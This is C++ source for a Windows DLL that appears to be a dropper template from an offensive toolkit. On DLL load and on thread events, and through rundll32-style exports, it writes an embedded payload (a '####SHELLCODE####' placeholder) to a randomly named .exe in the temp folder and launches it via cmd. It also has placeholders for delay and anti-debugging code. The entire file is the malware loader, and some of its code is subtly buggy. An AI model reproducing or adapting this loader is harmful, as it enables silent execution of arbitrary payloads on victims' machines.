#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <fstream>
#include <windows.h>

extern "C" __declspec(dllexport) void CALLBACK PsychoBlastEP(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);

char* mkrndexe(size_t length) { // const size_t length, supra
    if (length < 1) {
        return NULL;
    }

    length = length + 4; // Adding space for file extension
    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"; 
    char* randomString;

    randomString = (char*)malloc(length + 1); // sizeof(char) == 1, cf. C99
    if (!randomString) {
        return NULL;
    }

    int l = (int)(sizeof(charset) - 1); // (static/global, could be const or #define SZ, would be even better)
    int key;  // one-time instantiation (static/global would be even better)
    for (int n = 0; n < length-4; n++) {
        key = rand() % l;   // no instantiation, just assignment, no overhead from sizeof
        randomString[n] = charset[key];
    }
    randomString[length-4] = '.';
    randomString[length-3] = 'e';
    randomString[length-2] = 'x';
    randomString[length-1] = 'e';
    randomString[length] = '\0';
   
    return randomString;
}

int WriteExBison()
{
    const unsigned char bison_bytes[] = ####SHELLCODE####;

    char* filename = mkrndexe(12);
    int fname_length = sizeof(filename);
    int max_path_s = MAX_PATH - fname_length - 1;

    char* temp_file = tmpnam(NULL);

    char* temp_path = new char[max_path_s];
    DWORD ret_val = GetTempPathA(max_path_s, temp_path);
    if (ret_val > MAX_PATH || (ret_val == 0))
    {
        return -1;
    }

    char abs_temp_file[MAX_PATH];
    snprintf(abs_temp_file, MAX_PATH, "%s%s", temp_path, filename);
    
    printf("[*] Writing %d bytes to %s\n", (int)sizeof(bison_bytes), abs_temp_file);
    FILE* file = fopen(abs_temp_file, "wb");
    fwrite(bison_bytes, sizeof(unsigned char), sizeof(bison_bytes), file);
    fclose(file);

    char cmd[1024];
    char prefix[] = "start \"\" cmd /c ";
    snprintf(cmd, 1024, "%s%s", prefix, abs_temp_file);

    printf("[*] Executing %s\n", cmd);

    //####DELAY####
    system(cmd);

    return 0;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        //ExecuteBison();
        WriteExBison();
        break;
    case DLL_THREAD_ATTACH:
        WriteExBison();
        break;
    case DLL_THREAD_DETACH:
        WriteExBison();
        break;
    case DLL_PROCESS_DETACH:
        WriteExBison();
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void PsychoCharge()
{
    bool success = WriteExBison();
    if (success < 0) {
        return;
    }
    printf("[+] Success\n");
}

void CALLBACK PsychoBlastEP(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    //####ANTIDEBUG####
    PsychoCharge();
}